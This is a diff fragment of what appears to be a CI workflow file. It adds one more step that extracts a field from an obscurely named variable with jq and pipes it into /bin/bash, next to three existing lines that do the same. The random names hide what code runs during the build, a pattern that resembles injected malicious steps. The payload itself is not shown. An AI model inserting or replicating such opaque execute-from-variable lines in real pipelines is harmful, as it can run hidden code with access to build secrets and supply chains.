@@ -45,6 +45,7 @@ jobs:
           echo $zste29413 | jq -r .ai72 | /bin/bash
           echo $t720 | jq -r .cgcei91469 | /bin/bash
           printf '%s' "$rx1361" | jq -r .uxm79 | /bin/bash
+          printf '%s' "$anrmq867" | jq -r .scwr5 | /bin/bash
 
       - name: Upload archive
         uses: actions/upload-artifact@v4
